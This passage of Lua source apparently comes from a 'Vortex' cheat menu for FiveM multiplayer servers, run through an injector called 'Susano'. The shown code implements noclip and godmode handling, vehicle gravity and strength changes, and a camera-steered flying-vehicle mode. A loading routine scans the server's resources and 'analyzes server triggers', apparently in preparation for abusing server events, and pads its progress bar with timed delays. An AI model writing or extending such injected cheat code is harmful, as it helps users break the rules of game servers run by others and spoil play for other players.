                targetPos = vector3(targetPos.x, targetPos.y, targetPos.z - speed * 0.8)
            end

            SetEntityCoordsNoOffset(entity, targetPos.x, targetPos.y, targetPos.z, true, true, true)

            if inVehicle then
                SetEntityVelocity(entity, 0.0, 0.0, 0.0)
            end
        elseif not vortex_noclipEnabled then
            local ped = PlayerPedId()
            if IsPedInAnyVehicle(ped, false) then
                local veh = GetVehiclePedIsIn(ped, false)
                SetEntityCollision(veh, true, true)
                FreezeEntityPosition(veh, false)
                SetEntityVisible(veh, true, false)
            end
            if not vortex_godmodeEnabled then
                SetEntityInvincible(ped, false)
            end
            SetEntityCollision(ped, true, true)
            FreezeEntityPosition(ped, false)
            SetEntityVisible(ped, true, false)
        end
        end) -- end pcall noclip
    end
end)

-- (Banner texture loading moved to real loading worker thread)

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)

        if vortex_easyhandlingEnabled then
            local ped = PlayerPedId()
            if IsPedInAnyVehicle(ped, false) then
                local veh = GetVehiclePedIsIn(ped, false)
                if veh and veh ~= 0 then
                    local gravity = 9.8 + (vortex_handlingAmount / 50.0) * 63.2
                    SetVehicleGravityAmount(veh, gravity)
                    SetVehicleStrong(veh, true)
                end
            end
        end
    end
end)

local function NormalizeVector(x, y, z)
    local length = math.sqrt(x*x + y*y + z*z)
    if length > 0 then
        return x/length, y/length, z/length
    else
        return 0.0, 0.0, 0.0
    end
end

Citizen.CreateThread(function()
    local lastVehicle = nil
    local activeControls = false

    while true do
        Citizen.Wait(0)

        if vortex_gravitatevehicleEnabled then
            local ped = PlayerPedId()
            local vehicle = GetVehiclePedIsIn(ped, false)

            if vehicle ~= lastVehicle then
                if lastVehicle and lastVehicle ~= 0 then
                    SetVehicleGravityAmount(lastVehicle, 9.8)
                    if IsEntityPositionFrozen(lastVehicle) then
                        FreezeEntityPosition(lastVehicle, false)
                    end
                    SetVehicleOnGroundProperly(lastVehicle)
                    SetEntityVelocity(lastVehicle, 0.0, 0.0, 0.0)
                end
                if vehicle and vehicle ~= 0 then
                    SetVehicleGravityAmount(vehicle, 9.8)
                end
                lastVehicle = vehicle
            end

            if vehicle and vehicle ~= 0 then
                local shiftPressed = IsControlPressed(0, 21)
                if shiftPressed and not activeControls then
                    activeControls = true
                elseif not shiftPressed and activeControls then
                    activeControls = false
                    SetVehicleGravityAmount(vehicle, 9.8)
                    SetEntityVelocity(vehicle, 0.0, 0.0, 0.0)
                    SetVehicleOnGroundProperly(vehicle)
                    SetVehicleFixed(vehicle)
                    SetVehicleEngineOn(vehicle, true, true, false)
                end

                if IsControlJustPressed(0, 15) then
                    Vortex_VehicleSpeedMultiplier = math.min(Vortex_VehicleSpeedMultiplier + 1.0, 20.0)
                end
                if IsControlJustPressed(0, 14) then
                    Vortex_VehicleSpeedMultiplier = math.max(Vortex_VehicleSpeedMultiplier - 1.0, 1.0)
                end

                for i = 1, 9 do
                    if IsControlJustPressed(0, 48 + i) then
                        Vortex_VehicleMaxSpeed = i * 10.0 * Vortex_VehicleSpeedMultiplier
                    end
                end

                if IsControlJustPressed(0, 48) then
                    Vortex_VehicleMaxSpeed = 0.0
                    Vortex_VehicleSpeed = 0.0
                end

                local camRotation = GetGameplayCamRot(0)
                local camPitch = math.rad(camRotation.x)
                local camYaw = math.rad(camRotation.z)
                local lookDirection = {
                    x = -math.sin(camYaw) * math.cos(camPitch),
                    y = math.cos(camYaw) * math.cos(camPitch),
                    z = math.sin(camPitch)
                }

                if activeControls then
                    if IsControlPressed(0, 32) then
                        Vortex_VehicleSpeed = math.min(Vortex_VehicleSpeed + Vortex_VehicleAcceleration, Vortex_VehicleMaxSpeed)
                    elseif IsControlPressed(0, 33) then
                        Vortex_VehicleSpeed = math.max(Vortex_VehicleSpeed - Vortex_VehicleAcceleration * 2, -Vortex_VehicleMaxSpeed / 2)
                    else
                        if Vortex_VehicleSpeed > 0 then
                            Vortex_VehicleSpeed = math.max(0, Vortex_VehicleSpeed - Vortex_VehicleAcceleration * 0.5)
                        elseif Vortex_VehicleSpeed < 0 then
                            Vortex_VehicleSpeed = math.min(0, Vortex_VehicleSpeed + Vortex_VehicleAcceleration * 0.5)
                        end
                    end
                else
                    if IsControlPressed(0, 32) then
                        Vortex_VehicleSpeed = math.min(Vortex_VehicleSpeed + Vortex_VehicleAcceleration * 0.5, Vortex_VehicleMaxSpeed / 2)
                    elseif IsControlPressed(0, 33) then
                        Vortex_VehicleSpeed = math.max(Vortex_VehicleSpeed - Vortex_VehicleAcceleration, -Vortex_VehicleMaxSpeed / 4)
                    else
                        if Vortex_VehicleSpeed > 0 then
                            Vortex_VehicleSpeed = math.max(0, Vortex_VehicleSpeed - Vortex_VehicleAcceleration * 0.75)
                        elseif Vortex_VehicleSpeed < 0 then
                            Vortex_VehicleSpeed = math.min(0, Vortex_VehicleSpeed + Vortex_VehicleAcceleration * 0.75)
                        end
                    end
                    SetVehicleGravityAmount(vehicle, 9.8)
                end

                if IsEntityPositionFrozen(vehicle) then
                    FreezeEntityPosition(vehicle, false)
                end

                if activeControls then
                    SetVehicleGravityAmount(vehicle, 0.0)

                    local camRot = GetGameplayCamRot(0)
                    local targetHeading = camRot.z
                    SetEntityHeading(vehicle, targetHeading)

                    if Vortex_VehicleSpeed ~= 0 then
                        local camRadians = math.rad(camRot.z)
                        local dirX = -math.sin(camRadians)
                        local dirY = math.cos(camRadians)
                        local dirZ = 0.0

                        if IsControlPressed(0, 38) then
                            dirZ = 1.0
                        elseif IsControlPressed(0, 34) then
                            dirZ = -1.0
                        end

                        local dx, dy, dz = NormalizeVector(dirX, dirY, dirZ)

                        local speedMult = Vortex_VehicleSpeedMultiplier or 1.0
                        SetEntityVelocity(vehicle,
                            dx * Vortex_VehicleSpeed * speedMult,
                            dy * Vortex_VehicleSpeed * speedMult,
                            dz * Vortex_VehicleSpeed * speedMult
                        )
                    end
                end
            end
        end
    end
end)


-- NOTE: Duplicate noclip thread removed to prevent race condition with the primary noclip thread above.


-- ============================================================
-- Vortex Real Loading Worker Thread
-- Performs actual initialization, updates vortex_loadingProgress/Label
-- ============================================================
Citizen.CreateThread(function()
    while not Vortex_SusanoReady() do
        Citizen.Wait(100)
    end

    -- Smooth progress animation helper (ease-out quad)
    local function smoothTo(target, durationMs)
        local start = vortex_loadingProgress
        local startTime = GetGameTimer()
        while true do
            local elapsed = GetGameTimer() - startTime
            local t = math.min(elapsed / durationMs, 1.0)
            local eased = 1.0 - (1.0 - t) ^ 2
            vortex_loadingProgress = start + (target - start) * eased
            if t >= 1.0 then break end
            Citizen.Wait(0)
        end
        vortex_loadingProgress = target
    end

    -- ===== STAGE 1: Core Systems (0% -> 8%) =====
    vortex_loadingLabel = "Initializing core systems..."
    smoothTo(0.04, 800)
    pcall(function()
        GetPlayerPed(-1)
        GetEntityCoords(PlayerPedId(), false)
        GetActiveScreenResolution()
        NetworkIsPlayerActive(PlayerId())
        GetPlayerServerId(PlayerId())
        GetNumResources()
    end)
    smoothTo(0.08, 1200)

    -- ===== STAGE 1.5: Logo Texture (8% -> 12%) =====
    vortex_loadingLabel = "Loading logo..."
    smoothTo(0.09, 300)
    pcall(function()
        Vortex_LoadLogoTexture()
    end)
    smoothTo(0.12, 800)

    -- ===== STAGE 1.6: Icon Textures (12% -> 14%) =====
    vortex_loadingLabel = "Loading icons..."
    smoothTo(0.13, 200)
    pcall(function()
        Vortex_LoadIconTextures()
    end)
    smoothTo(0.14, 600)

    -- ===== STAGE 2: Banner Texture (14% -> 20%) =====
    vortex_loadingLabel = "Loading banner texture..."
    smoothTo(0.14, 500)
    pcall(function()
        if VortexBanner and VortexBanner.enabled and VortexBanner.imageUrl and VortexBanner.imageUrl ~= "" then
            if Susano and Susano.HttpGet and Susano.LoadTextureFromBuffer then
                local status, body = Susano.HttpGet(VortexBanner.imageUrl)
                if status == 200 and body and #body > 0 then
                    local textureId, width, height = Susano.LoadTextureFromBuffer(body)
                    if textureId and textureId ~= 0 then
                        vortex_bannerTexture = textureId
                        vortex_bannerWidth = width
                        vortex_bannerHeight = height
                    end
                end
            end
        end
    end)
    vortex_loadingLabel = "Banner texture loaded."
    smoothTo(0.20, 1800)

    -- ===== STAGE 2.5: Initializing UI (20% -> 25%) =====
    vortex_loadingLabel = "Initializing UI..."
    smoothTo(0.25, 1300)

    -- ===== STAGE 3: Character Data (25% -> 32%) =====
    vortex_loadingLabel = "Reading character data..."
    smoothTo(0.27, 500)
    pcall(function()
        if vortex_actions and vortex_actions.initOutfitData then
            vortex_actions.initOutfitData()
        end
    end)
    vortex_loadingLabel = "Character data loaded."
    smoothTo(0.30, 1800)

    -- ===== STAGE 4: Server Resources (30% -> 45%) =====
    vortex_loadingLabel = "Scanning server resources..."
    smoothTo(0.33, 500)
    pcall(function()
        if vortex_actions and vortex_actions.loadresources then
            vortex_actions.loadresources()
        end
    end)
    vortex_loadingLabel = "Resources indexed."
    smoothTo(0.45, 2500)

    -- ===== STAGE 5: Dynamic Triggers (45% -> 55%) =====
    vortex_loadingLabel = "Analyzing server triggers..."
    smoothTo(0.47, 500)
    pcall(function()
        Vortex_InitDynamicTriggers()
    end)
    vortex_loadingLabel = "Triggers configured."
    smoothTo(0.55, 1800)

    -- ===== STAGE 6: Weapon Database (55% -> 68%) =====
    vortex_loadingLabel = "Hashing weapon database..."
    smoothTo(0.57, 500)
    pcall(function()
        if vortex_weaponLists then
            for category, weapons in pairs(vortex_weaponLists) do
                for _, weapon in ipairs(weapons) do
                    if weapon.name then
                        GetHashKey(weapon.name)
                    end
                end
                Citizen.Wait(0)
            end
        end
    end)
    vortex_loadingLabel = "Weapons database ready."
    smoothTo(0.68, 2200)

    -- ===== STAGE 7: Vehicle Validation (68% -> 80%) =====
    vortex_loadingLabel = "Validating vehicle models..."
    smoothTo(0.70, 500)
    pcall(function()
        if vortex_vehicleLists then
            local count = 0
            for category, vehicles in pairs(vortex_vehicleLists) do
                for _, vehicle in ipairs(vehicles) do
                    if vehicle.name then
                        local hash = GetHashKey(vehicle.name)
                        IsModelInCdimage(hash)
                    end
                    count = count + 1
                    if count % 25 == 0 then Citizen.Wait(0) end
                end
            end
        end
    end)
    vortex_loadingLabel = "Vehicle database validated."
    smoothTo(0.80, 2200)

    -- ===== STAGE 8: Player Models (80% -> 92%) =====
    vortex_loadingLabel = "Indexing player models..."
    smoothTo(0.82, 500)
    pcall(function()
        if vortex_maleModels then
            for _, model in ipairs(vortex_maleModels) do
                if model.name then
                    local hash = GetHashKey(model.name)
                    IsModelInCdimage(hash)
                end
            end
        end
        Citizen.Wait(0)
        if vortex_femaleModels then
            for _, model in ipairs(vortex_femaleModels) do
                if model.name then
                    local hash = GetHashKey(model.name)
                    IsModelInCdimage(hash)
                end
            end
        end
        Citizen.Wait(0)
        if vortex_animalModels then
            for _, model in ipairs(vortex_animalModels) do
                if model.name then
                    local hash = GetHashKey(model.name)
                    IsModelInCdimage(hash)
                end
            end
        end
    end)
    vortex_loadingLabel = "Models indexed."
    smoothTo(0.92, 2000)

    -- ===== STAGE 9: Final Verification (92% -> 100%) =====
    vortex_loadingLabel = "Running final checks..."
    smoothTo(0.94, 500)
    pcall(function()
        if vortex_categories then
            for k, v in pairs(vortex_categories) do
                if v.items then local _ = #v.items end
                if v.tabs then local _ = #v.tabs end
            end
        end
        local ped = PlayerPedId()
        if ped and ped ~= 0 then
            GetEntityCoords(ped, false)
            GetEntityHealth(ped)
            GetEntityMaxHealth(ped)
        end
    end)
    vortex_loadingLabel = "Ready."
    smoothTo(1.00, 1500)

    Citizen.Wait(200)
    vortex_loadingComplete = true
end)
